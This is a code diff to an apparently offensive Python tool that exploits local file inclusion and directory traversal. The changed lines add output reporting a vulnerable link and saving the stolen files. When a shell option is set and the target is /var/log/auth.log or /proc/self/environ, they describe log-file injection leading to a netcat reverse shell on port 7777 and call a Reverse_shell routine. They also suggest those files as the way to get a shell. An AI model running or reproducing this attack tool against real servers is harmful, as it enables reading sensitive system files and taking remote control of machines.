@@ -193,9 +193,10 @@ class Read_File:
                            print("[+] Content-Length      : ................ | "+str(rex2[6]).replace(':',': '))
                            print("[+] Connection          : ................ | "+rex2[7])
                            print("[+] Content-Type        : ................ | "+rex2[8]+'\n')
-                           self.store_file()
-                           
-                           print('='*20+"\n[*] attack progres "+'\n'+'='*30+'\n')
+                           print('\n'+'='*20+"\n[*] Vulnerable Found  "+'\n'+'='*30+'\n')
+                           print("[+] Vulnerable  Link    : ................ | : "+self.url.replace('\n',''))                           
+                           self.store_file()                           
+                           print('\n'+'='*20+"\n[*] Directory Traversal "+'\n'+'='*30+'\n')
                            print("[+] File request        : ................ | : "+self.args.read.replace('\n','')) 
                            print("[+] Full Path           : ................ | : "+self.LFI.replace('\n',''))
                            print("[+] File Name           : ................ | : "+self.args.read.replace('/','',1).replace('/','_'))
@@ -206,16 +207,41 @@ class Read_File:
                                print("[+] save Locatoin       : ................ | : "+path+self.ip_re.group()+"/"\
                                +self.args.read.replace(self.args.read[0],'_'+self.args.read[0]).replace('/','_'))
                            if self.args.shell:
-                               self.Reverse_shell()
-                               exit()
+                                if  "auth" in  self.url or "auth.log" in  self.url\
+                                or "environ" in self.url: 
+                                    print('\n'+'='*20+"\n[*] Shell-Info "+'\n'+'='*30+'\n')
+                                    time.sleep(1)
+                                    print("[+] Attack type          : ................ | : Reverse-Shell") 
+                                    print("[+] Mothead              : ................ | : enjaction log file  ")
+                                    print("[+] Lisliner Tool        : ................ | : NETCAT ")
+                                    print("[+] Lisliner IP          : ................ | :",self.ip_re.group())   
+                                    print("[+] Lisliner Port        : ................ | : 7777") 
+                                    self.Reverse_shell()
+                                    exit()
+                                else:
+                                      print('\n'+'='*20+"\n[*] Shell-Info "+'\n'+'='*30+'\n')
+                                      time.sleep(1)
+                                      print("[*] FILE : ", self.args.read)
+                                      time.sleep(1)
+                                      print("[*] INFO :  Cat not add PHP Code To",self.args.read)
+                                      time.sleep(1)
+                                      print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
+                                      print("[*] To Get Shell try  --read  with 'environ/auth' log file ")  
+                                      print("[*] Example : --read /var/log/auth.log ")
+                                      print("[*] Example : --read /proc/self/environ")
+                                      print("[*] Example : --read /var/log/auth")
+                                      exit()            
                            else:
-                                exit()    
+                                exit()   
                     elif not self.args.auth and len(self.Get_Oregnal_URL) != len(first_req):
-                           self.store_file()  
-                           print('='*20+"\n[*] Directory Traversal "+'\n'+'='*30+'\n')
+                           self.store_file() 
+                           print('\n'+'='*20+"\n[*] Vulnerable Found  "+'\n'+'='*30+'\n')
+                           print("[+] Vulnerable  Link    : ................ | : "+self.url.replace('\n','')) 
+                           print('\n'+'='*20+"\n[*] Directory Traversal "+'\n'+'='*30+'\n')
                            print("[+] File request        : ................ | : "+self.args.read.replace('\n','')) 
                            print("[+] Full  URL           : ................ | : "+ self.LFI.replace('\n',''))
                            print("[+] File Name           : ................ | : "+self.args.read.replace('/','',1).replace('/','_'))
+                         
                            if '/' in self.args.read:
                                print("[+] save Locatoin       : ................ | : "+path+self.ip_re.group()+"/"\
                                +self.args.read.replace('/','',1).replace('/','_'))  
